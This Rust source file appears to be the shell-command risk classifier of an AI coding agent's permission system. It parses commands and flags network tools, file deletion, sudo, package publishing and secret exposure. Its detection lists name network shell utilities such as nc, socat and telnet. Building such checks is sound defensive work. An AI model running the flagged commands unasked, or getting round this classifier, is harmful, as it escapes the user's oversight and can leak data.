        let mut w = std::mem::take(&mut self.cur);
        let t = w.text.as_str();
        match lead {
            Some('*' | '?') => w.glob = true,
            Some('[') if t.len() > 1 && t.contains(']') => w.glob = true,
            Some('{') if t.contains(',') || t.contains("..") => w.glob = true,
            // zsh `=cmd` expands to the command's path
            Some('=') if t[1..].starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') => w.var = true,
            _ => {}
        }
        if std::mem::take(&mut self.redirect) {
            self.p.writes.push(w);
        } else if let Some(seg) = self.p.segments.last_mut() {
            seg.push(w);
        }
    }

    fn split(&mut self) {
        self.flush();
        self.p.segments.push(vec![]);
    }
}

fn parse(cmd: &str) -> Parsed {
    let mut lx = Lexer { p: Parsed { segments: vec![vec![]], ..Default::default() }, ..Default::default() };
    let mut it = cmd.chars().peekable();
    while let Some(c) = it.next() {
        match c {
            '\'' => {
                lx.in_word = true;
                for c in it.by_ref() {
                    if c == '\'' {
                        break;
                    }
                    lx.push(c, true);
                }
            }
            '"' => {
                lx.in_word = true;
                while let Some(c) = it.next() {
                    match c {
                        '"' => break,
                        '\\' => {
                            if let Some(n) = it.next() {
                                lx.push(n, true);
                            }
                        }
                        '`' => lx.p.complex = true,
                        '$' if it.peek() == Some(&'(') => lx.p.complex = true,
                        '$' => {
                            lx.cur.var |= it.peek().is_some_and(|n| expands(*n, true));
                            lx.push('$', true);
                        }
                        _ => lx.push(c, true),
                    }
                }
            }
            '\\' => {
                lx.in_word = true;
                if let Some(n) = it.next()
                    && n != '\n'
                {
                    lx.push(n, true);
                }
            }
            '`' => lx.p.complex = true,
            '$' if it.peek() == Some(&'(') => lx.p.complex = true,
            '$' => {
                lx.cur.var |= it.peek().is_some_and(|n| expands(*n, false));
                lx.push('$', false);
            }
            ' ' | '\t' => lx.flush(),
            '>' => {
                // "2>file" / "2>&1": a leading fd number is not a word.
                if lx.in_word && !lx.cur.text.is_empty() && lx.cur.text.chars().all(|c| c.is_ascii_digit()) {
                    lx.cur = Word::default();
                    lx.lead = None;
                    lx.in_word = false;
                } else {
                    lx.flush();
                }
                if it.peek() == Some(&'>') {
                    it.next();
                }
                let both = it.next_if_eq(&'&').is_some();
                // `2>&1`, `>&-`: a copy of a descriptor takes no file.
                let copies = both && classify::fd_copy(&mut it).is_some();
                if !both && it.peek() == Some(&'(') {
                    lx.p.complex = true;
                } else if !copies {
                    // A file follows: after `>` and `>>`, and after `>&` too (`cmd >&out.log`
                    // sends stdout and stderr there). `>|file` and zsh's `>!file` write it
                    // even where `noclobber` is set.
                    if matches!(it.peek(), Some('|' | '!')) {
                        it.next();
                    }
                    lx.redirect = true;
                }
            }
            '<' => {
                lx.flush();
                if matches!(it.peek(), Some('<') | Some('(')) {
                    lx.p.complex = true;
                }
            }
            '&' if it.peek() == Some(&'>') => {
                lx.flush();
                it.next();
                if it.peek() == Some(&'>') {
                    it.next();
                }
                if matches!(it.peek(), Some('|' | '!')) {
                    it.next();
                }
                lx.redirect = true;
            }
            '\n' | ';' | '|' | '&' | ')' => lx.split(),
            // Inside a word, `(` starts a zsh glob qualifier (`*(e:cmd:)` runs code), `=(…)`
            // or an extglob: nothing that can be checked.
            '(' if lx.in_word => lx.p.complex = true,
            '(' => lx.split(),
            // `{ …; }` is a group; `{a,b}` and `{}` are words.
            '{' | '}' if !lx.in_word && it.peek().is_none_or(|n| n.is_whitespace() || *n == ';') => lx.split(),
            _ => lx.push(c, false),
        }
    }
    lx.flush();
    let mut p = lx.p;
    p.segments.retain(|s| !s.is_empty());
    p
}

fn basename(p: &str) -> &str {
    p.rsplit('/').next().unwrap_or(p)
}

/// `--package=x` / `-p x` on npx, bunx or `npm exec`: installs and runs that registry package.
fn package_flag(args: &[String]) -> bool {
    options(args).any(|a| a.starts_with("--package") || (a.starts_with("-p") && !a.starts_with("--")))
}

/// `npx -c 'cmd'` / `npm exec --call 'cmd'` / `pnpm exec --shell-mode 'cmd'`: runs a shell
/// command string.
fn call_flag(args: &[String]) -> bool {
    options(args).any(|a| a == "-c" || a.starts_with("--call") || a == "--shell-mode")
}

/// Does a package command install for your account or the whole machine, not into the project
/// (`npm install -g x`, `yarn global add x`, `pip install --user x`, `cargo install x`,
/// `brew install x`)? It writes outside the worktree, and no path on the line shows it.
fn installs_outside(prog: &str, args: &[String]) -> bool {
    /// What `gem`, `pipx`, `uv tool` and the system package managers do to the machine.
    const CHANGES: &[&str] = &["install", "reinstall", "upgrade", "update", "remove", "uninstall"];
    let flag = |flags: &[&str]| options(args).any(|o| flags.contains(&o));
    let mut words = args.iter().map(String::as_str).filter(|a| !a.starts_with('-'));
    let sub = words.next().unwrap_or("");
    match prog {
        "npm" | "pnpm" | "yarn" | "bun" => {
            pm_subs(prog, args).iter().any(|(sub, _)| *sub == "global")
                || flag(&["-g", "--global", "--location=global"])
                || args.windows(2).any(|w| w[0] == "--location" && w[1] == "global")
        }
        "pip" | "pip3" => flag(&["--user", "--break-system-packages"]),
        "uv" => flag(&["--system", "--break-system-packages"]) || (sub == "tool" && words.next().is_some_and(|x| CHANGES.contains(&x))),
        "cargo" | "go" => sub == "install",
        "composer" => sub == "global",
        "gem" | "pipx" | "brew" | "apt" | "apt-get" | "yum" | "dnf" => CHANGES.contains(&sub),
        _ => false,
    }
}

/// Directories a git command is pointed at before its subcommand, seen from `start`: each
/// `-C dir` (relative to the one before), `--git-dir` and `--work-tree`.
fn git_dirs(args: &[String], start: &Path) -> Vec<PathBuf> {
    let (mut cur, mut out, mut i) = (start.to_path_buf(), vec![], 0);
    while let Some(a) = args.get(i).map(String::as_str).filter(|a| a.starts_with('-')) {
        let next = args.get(i + 1);
        match a {
            "-C" => {
                if let Some(d) = next {
                    cur.push(d);
                    out.push(cur.clone());
                }
            }
            "--git-dir" | "--work-tree" => out.extend(next.map(|d| cur.join(d))),
            _ => out.extend(["--git-dir=", "--work-tree="].iter().find_map(|f| a.strip_prefix(f)).map(|d| cur.join(d))),
        }
        i += if matches!(a, "-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace") { 2 } else { 1 };
    }
    out
}

/// Programs that talk to another machine: transfers, remote shells, name lookups (a host name
/// can carry data out), and the command lines of hosting and cloud accounts.
const NETWORK: &[&str] = &[
    "curl", "wget", "ssh", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "socat", "telnet", "ftp", "http", "https", "xh", "aria2c", "gh", "dig",
    "nslookup", "host", "whois", "ping", "ping6", "traceroute", "aws", "gcloud", "gsutil", "az", "kubectl", "helm", "terraform", "heroku", "vercel",
    "netlify", "flyctl", "wrangler", "firebase",
];

/// Subcommands that publish under your name, or change your account at a registry
/// (`npm publish`, `cargo yank`, `npm owner add`, `gem push`, `cargo login`).
const PUBLISHES: &[(&[&str], &[&str])] = &[
    (
        &["npm", "pnpm", "yarn", "bun"],
        &["publish", "unpublish", "deprecate", "owner", "access", "dist-tag", "token", "login", "logout", "adduser", "team", "org", "profile"],
    ),
    (&["cargo"], &["publish", "yank", "owner", "login", "logout"]),
    (&["poetry", "uv", "deno", "pdm", "hatch", "flit"], &["publish"]),
    (&["gem"], &["push", "yank", "owner", "signin", "signout"]),
    (&["twine"], &["upload"]),
];

/// Does a package manager's command publish, or change your account (`PUBLISHES`)? Maven and
/// Gradle run every goal on the line: `mvn clean deploy`, `gradle build publish`.
fn publishes(prog: &str, args: &[String]) -> bool {
    let mut words = args.iter().map(String::as_str).filter(|a| !a.starts_with('-'));
    match prog {
        "mvn" | "mvnw" => words.any(|goal| goal == "deploy" || goal.starts_with("release:")),
        "gradle" | "gradlew" => words.any(|task| task.rsplit(':').next().is_some_and(|name| name.starts_with("publish"))),
        _ => PUBLISHES.iter().any(|(progs, subs)| progs.contains(&prog) && subcommands(prog, args).iter().any(|sub| subs.contains(sub))),
    }
}

/// The words of a package manager's line that can be its subcommand: the first word that is
/// not an option, and before it each word that may be an option's value instead
/// (`pnpm --filter web publish`: `web`, then `publish`). Which options take a value is not
/// listed here, so a word after any option that holds no `=` counts as both. Nothing after
/// `--` is read: those words go to a script.
///
/// yarn names a workspace first, and its `npm` has subcommands of its own:
/// `yarn workspace web npm publish`, `yarn workspaces foreach -A npm publish`.
fn subcommands<'a>(prog: &str, args: &'a [String]) -> Vec<&'a str> {
    let (mut found, mut after_option) = (vec![], false);
    let mut words = args.iter().map(String::as_str).take_while(|w| *w != "--");
    while let Some(w) = words.next() {
        if w.starts_with('-') {
            after_option = !w.contains('=');
            continue;
        }
        found.push(w);
        match w {
            "workspace" if prog == "yarn" => drop(words.next()),
            "npm" | "workspaces" | "foreach" if prog == "yarn" => {}
            // `cargo +nightly publish` names a toolchain first.
            _ if after_option || (prog == "cargo" && w.starts_with('+')) => {}
            _ => break,
        }
        after_option = false;
    }
    found
}

/// Options of npm, pnpm, yarn and bun that stand before the subcommand and take a value in
/// the next word (`pnpm --filter web add x`, `npm --prefix web install`). With `=` the value
/// is in the option's own word.
const PM_VALUED: &[&str] = &["--filter", "-F", "-C", "--dir", "--prefix", "-w", "--workspace", "--cwd"];

/// The words of an npm, pnpm, yarn or bun line that can be its subcommand, each with the
/// words after it: the first word that is not an option, wherever it stands
/// (`pnpm --filter web add left-pad`: `add`).
///
/// Which of the four takes a value for which option of `PM_VALUED` is not listed, so the word
/// after such an option is read both ways: as the option's value with the subcommand behind
/// it, and as the subcommand itself. One switch is known: pnpm's `-w` is the workspace root
/// (`pnpm -w add x`), not npm's `-w <name>`. yarn names a workspace first
/// (`yarn workspace web add x`), or runs the subcommand in each of them
/// (`yarn workspaces foreach -A add x`). Which options of `foreach` take a value is not listed
/// either (`--include web`, `--jobs 2`): behind `foreach`, the word after an option that holds
/// no `=` is read both ways too.
fn pm_subs<'a>(prog: &str, args: &'a [String]) -> Vec<(&'a str, &'a [String])> {
    let (mut found, mut i) = (vec![], 0);
    // Behind `yarn workspaces foreach`, and there after an option that may take the next word.
    let (mut foreach, mut may_be_value) = (false, false);
    while let Some(a) = args.get(i).map(String::as_str) {
        i += 1;
        let valued = PM_VALUED.contains(&a) && !(prog == "pnpm" && a == "-w");
        if a.starts_with('-') && !valued {
            may_be_value = foreach && !a.contains('=');
            continue;
        }
        if valued {
            let Some(next) = args.get(i).map(String::as_str).filter(|next| !next.starts_with('-')) else { continue };
            i += 1;
            found.push((next, &args[i..]));
        } else if prog == "yarn" && a == "workspace" {
            i += 1; // the workspace's name
        } else if prog == "yarn" && !foreach && a == "workspaces" && args.get(i).is_some_and(|next| next == "foreach") {
            (i, foreach) = (i + 1, true);
        } else {
            found.push((a, &args[i..]));
            if !may_be_value {
                break;
            }
            may_be_value = false;
        }
    }
    found
}

/// What a package runner starts.
enum Started<'a> {
    /// A program, with its arguments.
    Program(&'a [String]),
    /// A line for a shell (`npx -c 'npm publish'`, `bun exec 'npm publish && ls'`).
    ShellLine(String),
}

/// Options of npx, bunx and `npm exec` that take no value: the word after one is the program.
const RUNNER_SWITCHES: &[&str] = &["-y", "--yes", "--no", "--no-install", "-q", "--quiet", "--bun"];

/// What the words after a package runner start (`runner_commands`). The runner's own options
/// stand first, and a `--` ends them. `-p pkg` and `--package pkg` take the next word;
/// `-c 'cmd'` and `--call 'cmd'` take a line for a shell. Which other options take a value is
/// not listed, so the word after one that holds no `=` and is not in `RUNNER_SWITCHES` is read
/// both ways: as the program, and as the option's value with the program behind it
/// (`npm exec -w web npm publish`: `web`, then `npm publish`).
///
/// With `shell_line`, what the runner starts is a line for a shell, not a program.
///
/// Also says how many of the words can be the runner's own: its options and their values, up
/// to the `--` or to the first word that can only be the program. The words behind that
/// belong to the program (`pnpm exec eslint -c x.json`: `-c` is eslint's).
fn runner_starts<'a>(words: &'a [String], shell_line: bool) -> (Vec<Started<'a>>, usize) {
    let start = |command: &'a [String]| if shell_line { Started::ShellLine(command.join(" ")) } else { Started::Program(command) };
    let (mut found, mut i, mut may_be_value) = (vec![], 0, false);
    let mut own = words.len();
    while let Some(word) = words.get(i).map(String::as_str) {
        i += 1;
        match word {
            "--" => {
                found.extend(words.get(i..).filter(|rest| !rest.is_empty()).map(&start));
                own = i - 1;
                break;
            }
            "-p" | "--package" => (i, may_be_value) = (i + 1, false),
            "-c" | "--call" => {
                found.extend(words.get(i).map(|line| Started::ShellLine(line.clone())));
                (i, may_be_value) = (i + 1, false);
            }
            _ if word.starts_with("--call=") => {
                found.push(Started::ShellLine(word["--call=".len()..].to_string()));
                may_be_value = false;
            }
            _ if word.starts_with('-') => may_be_value = !word.contains('=') && !RUNNER_SWITCHES.contains(&word),
            _ => {
                found.push(start(&words[i - 1..]));
                if !may_be_value {
                    own = i - 1;
                    break;
                }
                may_be_value = false;
            }
        }
    }
    (found, own)
}

/// What a package runner starts: what follows `npx` or `bunx`, and what follows the `exec`
/// (`x`, `dlx`) of npm, pnpm, yarn or bun (`runner_starts`). bun's `exec` takes a line for a
/// shell, not a program and its arguments (`bun exec 'npm publish && ls'`).
fn runner_commands<'a>(prog: &str, args: &'a [String]) -> Vec<Started<'a>> {
    match prog {
        "npx" | "bunx" => runner_starts(args, false).0,
        "npm" | "pnpm" | "yarn" | "bun" => pm_subs(prog, args)
            .into_iter()
            .filter(|(sub, _)| matches!(*sub, "exec" | "x" | "dlx"))
            .flat_map(|(sub, rest)| runner_starts(rest, prog == "bun" && sub == "exec").0)
            .collect(),
        _ => vec![],
    }
}

/// The words of an `exec` line among which a `-c` is the package manager's own and makes it
/// run a line in a shell (`call_flag`). `rest` are the words after `exec`.
/// - npm reads the options of the whole line as its own, behind the program too, up to a
///   `--`: `npm exec eslint -c x.json` runs `x.json` as a line for a shell.
/// - pnpm, yarn and bun give the words behind the program to that program
///   (`pnpm exec eslint -c x.json`): theirs are the words before `exec` and, after it, the
///   runner's own options (`runner_starts`).
///
/// From the documentation of the CLIs (`npm exec`, "npx vs npm exec"; `pnpm exec`), not from
/// a recording.
fn exec_options<'a>(prog: &str, args: &'a [String], rest: &[String]) -> &'a [String] {
    if prog == "npm" {
        return args;
    }
    &args[..args.len() - rest.len() + runner_starts(rest, false).1]
}

/// Programs that start another program in the project's environment (`uv run pytest`,
/// `poetry run python x.py`, `bundle exec rake`). Which of their own options take a value is
/// not verified, so the command behind one is not read from its place on the line: an
/// interpreter is looked for among its words, and so are the programs of `READ_BY_NAME`
/// (`env_runner_commands`).
const ENV_RUNNERS: &[&str] = &["uv", "poetry", "pipenv", "pdm", "hatch", "rye", "conda", "mise", "bundle"];

/// The programs that are read by their name behind one of `ENV_RUNNERS`: the package
/// managers, the programs that publish, git, and the command lines of GitHub and Docker.
const READ_BY_NAME: &[&str] = &["npm", "pnpm", "yarn", "bun", "cargo", "pip", "pip3", "uv", "poetry", "twine", "gem", "git", "gh", "docker"];

/// The commands that may stand behind one of `ENV_RUNNERS`: after its `run` or `exec` (for
/// mise also `x`), every word that names one of `READ_BY_NAME` may be the program it starts,
/// with the words after it. Each is read as a command of its own, and the line carries the
/// risks of all of them. A word that only looks like a program (`uv run pytest -k docker`)
/// asks once too often. The names of these subcommands are from the documentation of the
/// CLIs, not from a recording.
fn env_runner_commands<'a>(prog: &str, args: &'a [String]) -> Vec<&'a [String]> {
    if !ENV_RUNNERS.contains(&prog) {
        return vec![];
    }
    let runs = |word: &String| matches!(word.as_str(), "run" | "exec") || (prog == "mise" && word == "x");
    let Some(run) = args.iter().position(runs) else { return vec![] };
    (run + 1..args.len()).filter(|&at| READ_BY_NAME.contains(&basename(&args[at]))).map(|at| &args[at..]).collect()
}

/// Every command a program starts: what a package runner starts (`runner_commands`), and what
/// may stand behind another runner (`env_runner_commands`).
fn started_by<'a>(prog: &str, args: &'a [String]) -> Vec<Started<'a>> {
    let mut started = runner_commands(prog, args);
    started.extend(env_runner_commands(prog, args).into_iter().map(Started::Program));
    started
}

/// Is this word the `config` subcommand of the program? npm and pnpm also call it `c`.
fn names_config(prog: &str, word: &str) -> bool {
    word == "config" || (word == "c" && matches!(prog, "npm" | "pnpm"))
}

/// The words after a package manager's `config` subcommand, for each word of the line that
/// can be it: behind an option's value too (`subcommands`), where a word named like it may be
/// that value instead (`npm --prefix c config set …`).
fn config_args<'a>(prog: &str, args: &'a [String]) -> impl Iterator<Item = &'a [String]> {
    (0..args.len())
        .filter(move |&at| names_config(prog, &args[at]) && subcommands(prog, &args[..=at]).last() == Some(&args[at].as_str()))
        .map(move |at| &args[at + 1..])
}

/// Does a package manager's command write its settings (`npm config set registry …`,
/// `pip config unset …`, `poetry config <key> <value>`, `bundle config set <name> <value>`,
/// `composer config <key> <value>`, `gem sources --add …`)? They are your own setup, for
/// every project on this Mac: a registry, a proxy, a token. A command that only reads them
/// (`npm config get`, `pip config list`, `poetry config --list`, `bundle config get <name>`,
/// `composer config --list`) is not one. What each `config` takes is from the documentation
/// of the CLIs, not from a recording.
fn changes_settings(prog: &str, args: &[String]) -> bool {
    /// What `config` is told to do when it writes.
    const WRITES: &[&str] = &["set", "delete", "del", "rm", "unset", "edit", "fix"];
    /// The words after `config` that are no option: a key, and a value when it writes one.
    fn words(rest: &[String]) -> Vec<&str> {
        rest.iter().map(String::as_str).filter(|a| !a.starts_with('-')).collect()
    }
    // What it is told to do, behind an option's value too (`npm config --location global set …`).
    let config_writes = || config_args(prog, args).any(|rest| subcommands(prog, rest).iter().any(|action| WRITES.contains(action)));
    match prog {
        // `npm set key value` is `npm config set key value`.
        "npm" | "pnpm" => config_writes() || pm_subs(prog, args).iter().any(|(sub, _)| *sub == "set"),
        "yarn" | "pip" | "pip3" => config_writes(),
        // poetry has no `set`: a key with a value writes it, and `--unset` removes it.
        "poetry" => config_args(prog, args).any(|rest| has(rest, &["--unset"]) || words(rest).len() >= 2),
        // bundler: `set` and `unset`, and its older forms, a name with a value and `--delete`.
        // `config`, `config list`, `config get <name>` and `config <name>` read.
        "bundle" => config_args(prog, args).any(|rest| {
            has(rest, &["--delete"])
                || match words(rest).as_slice() {
                    ["set" | "unset", ..] => true,
                    ["get" | "list", ..] => false,
                    name_and_value => name_and_value.len() >= 2,
                }
        }),
        // composer: a key with a value writes it, `--unset` removes it, `--editor` opens the
        // file. `composer global <command>` runs the command on the setup of your account.
        "composer" => {
            first_non_flag(args) == Some("global")
                || config_args(prog, args).any(|rest| has(rest, &["--unset", "--editor", "-e"]) || words(rest).len() >= 2)
        }
        // `gem sources` lists them; `--add`, `--remove` and the like change the list.
        "gem" => first_non_flag(args) == Some("sources") && options(args).any(|option| !matches!(option, "-l" | "--list")),
        _ => false,
    }
}

/// The package managers and runners of Node that start another program (`pnpm exec node -e …`).
/// What they start is read whole (`runner_commands`), and an interpreter among their words is
/// read too, as behind one of `ENV_RUNNERS` (`uv run python -c …`, `bundle exec ruby -e …`).
const NODE_RUNNERS: &[&str] = &["npm", "pnpm", "yarn", "bun", "npx", "bunx"];

/// The risk label for a command that writes a package manager's settings (`changes_settings`).
const OWN_SETUP: &str = "changes package manager settings";

/// The risk labels a saved rule can cover (`rule_offer`): a package manager's download, an
/// npx download, a git command that changes the repository.
const PACKAGE_INSTALL: &str = "network (package install)";
const NPX_DOWNLOAD: &str = "network (npx)";
const GIT_WRITE: &str = "git write (Codly commits and merges for you)";
const DELETES: &[&str] = &["rm", "rmdir", "unlink", "shred", "srm", "trash"];
const HARMLESS_PATHS: &[&str] = &["/dev/null", "/dev/stdout", "/dev/stderr"];

/// Values a word may stand for: each alternative of its brace lists (`{a,/etc/x}`,
/// `src/{a,b}/x`) and, for each, an option's value glued to its flag (`-f/etc/hosts`,
/// `--file=/etc/hosts`, `FOO=~/x`) and the `~` entries of a `:` list (`PATH=x:~/bin`). None
/// when the alternatives are too many to list: the word may name anything.
fn path_candidates(t: &str) -> Option<Vec<String>> {
    let mut out = vec![];
    for t in classify::braces(t)? {
        if let Some((_, v)) = t.split_once('=') {
            out.push(v.to_string());
        }
        if t.starts_with('-') {
            let v = t.trim_start_matches('-').trim_start_matches(|c: char| c.is_ascii_alphabetic());
            if !v.is_empty() {
                out.push(v.to_string());
            }
        }
        out.extend(t.split(':').skip(1).filter(|p| p.starts_with('~')).map(str::to_owned));
        out.push(t);
    }
    Some(out)
}

fn path_outside(v: &str, base: Option<&Path>, root: Option<&Path>) -> bool {
    if v.starts_with('~') {
        return true; // `~`, `~/x`, `~user/x`
    }
    if HARMLESS_PATHS.contains(&v) {
        return false;
    }
    match (base, root) {
        (Some(base), Some(root)) => escapes(&resolve(base, v), root),
        _ => v.starts_with('/'),
    }
}

/// Could this argument name something outside the worktree? A `$` expansion is unknown, so
/// it could (`cat $HOME/.profile`).
fn word_outside(w: &Word, base: Option<&Path>, root: Option<&Path>) -> bool {
    w.var || path_candidates(&w.text).is_none_or(|values| values.iter().any(|v| path_outside(v, base, root)))
}

/// The same for a command name: `/usr/bin/git` is fine, `~/bin/x`, `../../x.sh` and `$X` are not.
fn program_outside(w: &Word, base: Option<&Path>, root: Option<&Path>) -> bool {
    w.var || w.text.starts_with('~') || (w.text.contains("..") && path_outside(&w.text, base, root))
}

fn command_risks(cmd: &str, cwd: Option<&Path>, worktree: Option<&Path>, depth: u8) -> Vec<String> {
    let p = parse(cmd);
    let mut risks = vec![];
    let mut add = |r: &str| {
        if !risks.iter().any(|x: &String| x == r) {
            risks.push(r.to_string());
        }
    };
    if p.complex {
        add("command substitution or shell expansion (cannot be checked)");
    }
    let base = cwd.or(worktree);
    let root = worktree.unwrap_or(Path::new(""));
    let codly_data = |w: &Word| path_candidates(&w.text).is_none_or(|values| values.iter().any(|v| private_path(v, base, worktree)));
    for w in &p.writes {
        if word_outside(w, base, worktree) {
            add("outside worktree");
        }
        if codly_data(w) {
            add(CODLY_DATA);
        }
        for why in classify::guarded_word(&w.text, root) {
            add(why);
        }
    }
    // Where the next simple command runs: `cd` moves it.
    let mut dir = base.map(Path::to_path_buf);
    for seg in &p.segments {
        let texts: Vec<String> = seg.iter().map(|w| w.text.clone()).collect();
        let start = classify::command_start(&texts);
        let at = start.unwrap_or(texts.len());
        for (k, w) in seg.iter().enumerate() {
            let command_word = k == at || (k < at && classify::is_wrapper(&w.text));
            if if command_word { program_outside(w, base, worktree) } else { word_outside(w, base, worktree) } {
                add("outside worktree");
            }
            if codly_data(w) {
                add(CODLY_DATA);
            }
        }
        if texts[..at].iter().any(|w| matches!(basename(w), "sudo" | "doas")) {
            add("sudo");
        }
        let Some(start) = start else {
            add("runs dynamic code"); // `env -S 'git push'`
            continue;
        };
        let Some(first) = seg.get(start) else {
            // `env` with no command prints the environment
            if texts.iter().any(|t| basename(t) == "env") {
                add(classify::SECRETS);
            }
            continue;
        };
        if first.var || first.glob {
            add("runs dynamic code"); // `$CMD args`: the program itself is unknown
            continue;
        }
        let prog = basename(&first.text).to_string();
        let args = &texts[start + 1..];
        // `cd`, `cd -`, `pushd`, `popd` without a directory go home or back: outside.
        if matches!(prog.as_str(), "cd" | "pushd" | "popd") && args.iter().all(|a| a.starts_with('-')) {
            add("outside worktree");
        }
        if matches!(prog.as_str(), "cd" | "pushd")
            && let (Some(d), Some(to)) = (dir.as_mut(), args.iter().find(|a| !a.starts_with('-')))
        {
            d.push(to);
            if worktree.is_some_and(|w| nested_repo(d.as_path(), w)) {
                add(NESTED_REPO);
            }
        }
        // `GIT_DIR=sub git status` points git at another repository, as `--git-dir` does.
        if let (Some(d), Some(w)) = (dir.as_deref(), worktree)
            && texts[..start].iter().filter_map(|t| t.strip_prefix("GIT_DIR=")).any(|g| nested_repo(&d.join(g), w))
        {
            add(NESTED_REPO);
        }
        // Programs that run other programs: check what they run.
        let mut runs: Vec<(String, Vec<String>)> = vec![(prog.clone(), args.to_vec())];
        if prog == "find"
            && let Some(i) = args.iter().position(|a| ["-exec", "-execdir", "-ok", "-okdir"].contains(&a.as_str()))
            && let Some(x) = args.get(i + 1)
        {
            runs.push((basename(x).to_string(), args[i + 2..].to_vec()));
        }
        if (ENV_RUNNERS.contains(&prog.as_str()) || NODE_RUNNERS.contains(&prog.as_str()))
            && let Some(i) = args.iter().position(|a| classify::is_interpreter(basename(a)))
        {
            runs.push((basename(&args[i]).to_string(), args[i + 1..].to_vec()));
        }
        // `pnpm exec npm publish`, `npx npm publish` and `uv run npm publish` run npm: the
        // command a runner starts is read like any other command, and so is one that it
        // starts in turn.
        let mut read = 0;
        while let Some((runner, runner_args)) = runs.get(read).cloned() {
            read += 1;
            for command in started_by(&runner, &runner_args) {
                let words = match command {
                    Started::Program(words) => words,
                    // A line for a shell is read as `sh -c` is.
                    Started::ShellLine(line) if depth < 3 => {
                        for r in command_risks(&line, cwd, worktree, depth + 1) {
                            add(&r);
                        }
                        continue;
                    }
                    Started::ShellLine(_) => {
                        add("runs dynamic code");
                        continue;
                    }
                };
                // Past a wrapper in front of it (`pnpm exec env CI=1 npm publish`).
                let Some(at) = classify::command_start(words) else {
                    add("runs dynamic code");
                    continue;
                };
                if words[..at].iter().any(|w| matches!(basename(w), "sudo" | "doas")) {
                    add("sudo");
                }
                let Some(name) = words.get(at) else { continue };
                let started = (basename(name).to_string(), words[at + 1..].to_vec());
                if !runs.contains(&started) {
                    runs.push(started);
                }
            }
        }
        // `python -m pip install x` runs pip.
        let modules: Vec<(String, Vec<String>)> =
            runs.iter().filter_map(|(prog, args)| classify::python_module(prog, args)).map(|(module, rest)| (module.to_string(), rest.to_vec())).collect();
        runs.extend(modules);
        // Does `npx <args>` run a tool the project has installed, seen from where it runs?
        let npx_local = |args: &[String]| dir.as_deref().is_some_and(|d| classify::npx_runs_local(args, d, root));
        for (prog, args) in runs {
            let a = args.as_slice();
            for r in classify::exposure(&prog, a, root) {
                add(r);
            }
            if installs_outside(&prog, a) {
                add("outside worktree");
            }
            if classify::inline_code(&prog, a) {
                add("runs dynamic code");
            }
            if publishes(&prog, a) {
                add("publish");
            }
            if changes_settings(&prog, a) {
                add(OWN_SETUP);
            }
            match prog.as_str() {
                "sudo" | "doas" | "su" => add("sudo"),
                p if DELETES.contains(&p) => add("deletes files"),
                "find" if has(a, &["-delete"]) => add("deletes files"),
                p if NETWORK.contains(&p) => add("network"),
                "openssl" if first_non_flag(a).is_some_and(|sub| ["s_client", "s_server", "s_time", "ocsp"].contains(&sub)) => add("network"),
                // `python -m http.server` serves the folder to the network.
                "http.server" => add("network"),
                "chmod" | "chown" | "chgrp" if has(a, &["-R", "--recursive"]) => add("changes permissions recursively"),
                "dd" | "mkfs" | "diskutil" | "fdisk" => add("disk"),
                "kill" | "pkill" | "killall" | "launchctl" | "systemctl" | "shutdown" | "reboot" => add("system"),
                // Jobs that run later, the settings of macOS and its apps, scripts that drive them.
                "crontab" | "at" | "batch" | "defaults" | "osascript" => add("system"),
                // Hands a file or an address to another app: a browser, Terminal for a `.command` file.
                "open" | "xdg-open" => {
                    add("system");
                    if a.iter().any(|x| x.contains("://")) {
                        add("network");
                    }
                }
                // The clipboard, the screen and the keychain can hold a password.
                "pbpaste" | "screencapture" | "security" => add(classify::SECRETS),
                "docker" | "podman" => add("containers"),
                "eval" | "source" | "." => add("runs dynamic code"),
                p if classify::SHELLS.contains(&p) => match classify::shell_run(a) {
                    ShellRun::Command(inner) if depth < 3 => {
                        for r in command_risks(inner, cwd, worktree, depth + 1) {
                            add(&r);
                        }
                    }
                    ShellRun::Command(_) => add("runs dynamic code"),
                    ShellRun::Stdin => add("pipes into a shell"),
                    ShellRun::Script => {}
                },
                "git" => {
                    if let (Some(d), Some(w)) = (dir.as_deref(), worktree)
                        && git_dirs(a, d).iter().any(|g| nested_repo(g, w))
                    {
                        add(NESTED_REPO);
                    }
                    let (sub, rest) = git_sub(a);
                    match sub.unwrap_or("") {
                        "push" => add("push"),
                        "fetch" | "pull" | "clone" | "ls-remote" | "submodule" => add("network"),
                        "clean" => add("deletes files"),
                        "reset" if has(rest, &["--hard"]) => add("discards changes"),
                        "restore" | "checkout" if rest.iter().any(|x| x == "--" || x == ".") => add("discards changes"),
                        s if !git_read_only(s, rest) => add(GIT_WRITE),
                        _ => {}
                    }
                }
                // The subcommand, wherever it stands (`pnpm --filter web add left-pad`).
                "npm" | "pnpm" | "yarn" | "bun" => {
                    for (sub, rest) in pm_subs(&prog, a) {
                        match sub {
                            "install" | "i" | "add" | "ci" | "update" | "upgrade" | "up" | "remove" | "rm" | "uninstall" | "dlx" | "x"
                            | "create" => add(PACKAGE_INSTALL),
                            "exec" if package_flag(a) => add(PACKAGE_INSTALL),
                            // Only a `-c` of the package manager's own, not one of the
                            // program it starts (`pnpm exec eslint -c x.json`).
                            "exec" if call_flag(exec_options(&prog, a, rest)) => add("runs dynamic code"),
                            // `npm exec` is npx: it downloads what the project does not have
                            // (pnpm and yarn only run what is installed).
                            "exec" if prog == "npm" && !npx_local(rest) => add(NPX_DOWNLOAD),
                            _ => {}
                        }
                    }
                }
                "npx" | "bunx" if !npx_local(a) => add(NPX_DOWNLOAD),
                "pip" | "pip3" | "poetry" | "uv" | "pipx" | "gem" | "bundle" | "brew" | "apt" | "apt-get" | "yum" | "dnf" | "composer" => {
                    let sub = first_non_flag(a);
                    if sub.is_some_and(|x| {
                        ["install", "add", "update", "upgrade", "sync", "lock", "require", "remove", "uninstall", "pip", "tool"]
                            .contains(&x)
                    }) || (prog == "pipx" && sub == Some("run"))
                        || (prog == "uv" && classify::uv_run_fetches(a))
                    {
                        add(PACKAGE_INSTALL);
                    }
                }
                // uvx runs a package from PyPI; tox and nox install what their config lists.
                "uvx" | "tox" | "nox" => add(PACKAGE_INSTALL),
                "cargo" if first_non_flag(a).is_some_and(|x| ["install", "add", "remove", "update"].contains(&x)) => add(PACKAGE_INSTALL),
                "go" if first_non_flag(a).is_some_and(|x| ["get", "install"].contains(&x)) => add(PACKAGE_INSTALL),
                _ => {}
            }
        }
    }
    risks
}

// ───────────────────────────── your own project folder ─────────────────────────────

/// What `loses_work` names: the reason on the request.
